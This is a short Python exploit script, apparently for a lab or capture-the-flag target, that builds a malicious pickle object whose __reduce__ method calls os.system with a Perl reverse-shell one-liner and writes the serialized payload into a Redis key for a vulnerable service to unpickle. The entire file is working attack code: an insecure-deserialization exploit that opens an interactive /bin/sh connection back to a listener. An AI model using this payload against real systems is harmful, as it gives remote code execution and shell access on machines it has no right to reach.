# env = python 3.7.5
import urllib, requests, socket
import os
import pickle, redis

class exp(object):
    def __reduce__(self):
        s = """perl -e 'use Socket;$i="127.0.0.1";$p=10163;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""

        return (os.system, (s,))

e = exp()
s = pickle.dumps(e)

r = redis.Redis(host='127.0.0.1', port=10163, db=0)
r.set("e6c36e69a9cf9543243d7921aa1a3d8093b49441", s)
